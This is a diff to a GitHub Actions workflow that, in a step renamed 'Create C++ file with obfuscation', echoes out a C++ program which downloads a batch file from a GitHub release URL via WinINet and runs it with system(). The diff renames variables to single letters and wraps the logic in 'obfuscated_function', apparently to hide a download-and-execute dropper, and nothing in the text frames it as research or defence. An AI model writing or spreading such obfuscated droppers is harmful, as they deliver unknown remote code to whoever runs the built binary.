@@ -21,37 +21,37 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Set up C++ compiler
-      uses: actions/setup-msbuild@v1
+    - name: Install Visual Studio Build Tools
+      run: |
+        choco install visualstudio2019buildtools --version 16.11.12 --includeRecommended
 
-    - name: Create C++ file
+    - name: Create C++ file with obfuscation
       run: |
         echo "#include <iostream>" > script.cpp
         echo "#include <fstream>" >> script.cpp
-        echo "#include <sstream>" >> script.cpp
         echo "#include <windows.h>" >> script.cpp
+        echo "#include <wininet.h>" >> script.cpp
         echo "" >> script.cpp
-        echo "int main() {" >> script.cpp
-        echo "    // Download file" >> script.cpp
-        echo "    const char* url = \"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\";" >> script.cpp
-        echo "    const char* outFile = \"download.bat\";" >> script.cpp
-        echo "    HINTERNET hInternet = InternetOpen(L\"MyApp\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);" >> script.cpp
-        echo "    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);" >> script.cpp
-        echo "    if (hConnect) {" >> script.cpp
-        echo "        std::ofstream file(outFile, std::ios::binary);" >> script.cpp
-        echo "        char buffer[4096];" >> script.cpp
-        echo "        DWORD bytesRead;" >> script.cpp
-        echo "        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {" >> script.cpp
-        echo "            file.write(buffer, bytesRead);" >> script.cpp
+        echo "int x = 0;" >> script.cpp
+        echo "void obfuscated_function() {" >> script.cpp
+        echo "    const char* u = \"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\";" >> script.cpp
+        echo "    const char* o = \"download.bat\";" >> script.cpp
+        echo "    HINTERNET i = InternetOpen(L\"MyApp\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);" >> script.cpp
+        echo "    HINTERNET c = InternetOpenUrlA(i, u, NULL, 0, INTERNET_FLAG_RELOAD, 0);" >> script.cpp
+        echo "    if (c) {" >> script.cpp
+        echo "        std::ofstream f(o, std::ios::binary);" >> script.cpp
+        echo "        char b[4096];" >> script.cpp
+        echo "        DWORD r;" >> script.cpp
+        echo "        while (InternetReadFile(c, b, sizeof(b), &r) && r > 0) {" >> script.cpp
+        echo "            f.write(b, r);" >> script.cpp
         echo "        }" >> script.cpp
-        echo "        file.close();" >> script.cpp
-        echo "        InternetCloseHandle(hConnect);" >> script.cpp
+        echo "        f.close();" >> script.cpp
+        echo "        InternetCloseHandle(c);" >> script.cpp
         echo "    }" >> script.cpp
-        echo "    InternetCloseHandle(hInternet);" >> script.cpp
-        echo "    // Execute the batch file" >> script.cpp
+        echo "    InternetCloseHandle(i);" >> script.cpp
         echo "    system(\"download.bat\");" >> script.cpp
-        echo "    return 0;" >> script.cpp
         echo "}" >> script.cpp
+        echo "int main() { obfuscated_function(); return 0; }" >> script.cpp
 
     - name: Compile C++ Script
       run: |
